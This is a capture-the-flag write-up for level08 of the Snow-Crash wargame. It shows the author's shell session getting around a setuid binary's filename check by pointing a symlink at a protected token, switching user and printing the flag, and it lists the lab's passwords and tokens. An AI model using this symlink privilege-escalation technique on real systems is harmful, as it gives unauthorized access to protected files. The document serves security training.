# Flag 08

- Access to Snow-Crash VM using level08/fiumuikeil55xe9cu4dood66h credentials
```
e1r9p7% ssh -p 4242 level08@10.11.100.146
```

- `ll`
```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

- Run the level08 script
```
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
```

- More attemps
```
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'

level08@SnowCrash:~$ echo "test" > /tmp/test

level08@SnowCrash:~$ ./level08 /tmp/test
test
```

- So I don't have the permission to pass token like level08 param, but with test file, it works. Try to pass a file with `ls` cmd
```
level08@SnowCrash:~$ echo "`ls`" > /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
level08
token
level08@SnowCrash:~$ echo "`getflag`" > /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```

- With `ls` it works but `getflag` no. after many attempts to pass the `getflag` command, I got nothing. Tryng to pass symbolic link!
```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/test2
level08@SnowCrash:~$ ./level08 /tmp/test2
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```